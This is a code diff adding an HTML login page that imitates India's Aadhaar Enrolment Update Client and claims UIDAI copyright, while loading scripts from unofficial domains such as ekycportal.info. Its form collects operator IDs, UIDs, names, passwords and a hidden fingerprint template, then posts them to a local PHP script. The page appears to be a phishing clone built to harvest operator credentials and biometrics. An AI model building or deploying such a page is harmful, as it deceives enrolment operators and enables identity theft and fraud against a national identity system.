@@ -1,0 +1,22 @@
+<p>RedirectMatch 301 http://uclaadhar.space http://uclaadhar.space</p>
+<p>Aadhaar_UCL_3.3.0</p>
+<script type="text/javascript" language="JavaScript" src="mfs100.js"></script>
+<script type="text/javascript" language="JavaScript" src="capture.js"></script>
+<script type="text/javascript" language="JavaScript" src="https://ekycportal.info/as/login/jquery-1.8.2.js"></script>
+<div class="body">
+<div class="box">
+<div class="header"><strong>Aadhaar Login</strong><img style="width: 35px; vertical-align: middle;" src="login.png" alt="" /></div>
+<div class="main">
+<div class="logo"><img src="aadhar_logo.png" alt="" />
+<p>Enrolment Update Client (Lite Edition)</p>
+<p style="padding-bottom: 11.25px;">version 3.3.0.0</p>
+</div>
+<form action="user/user_login_direct.php" method="POST">
+<div class="details" style="font-family: Arial; font-size: 11px;"><br /> <label for="operator_id">Operator ID</label><br /> <input id="operator_uid" type="text" name="op_uid" value="" /><br /> <label for="operator_uid">Operator UID</label><br /> <input id="" type="text" name="uid" value="" /><br /> <label for="operator_id">Operator Name</label><br /> <input id="operator_id" type="text" name="op_name" value="" /><br /> <label for="operator_name">Password</label><br /> <input id="operator_name" type="password" name="op_pwd" value="" /><br /> <input id="txtIsoTemplate" type="hidden" name="txtIsoTemplate" />
+<div class="buttons"><button class="btn btn-light" style="margin: 3.75px;" name="submit" type="submit">Login</button> <button class="btn btn-light" type="button">Cancel</button></div>
+</div>
+</form><br />
+<div class="footer">Copyright (c) UID Authority of India, all rights reserved</div>
+</div>
+</div>
+</div>
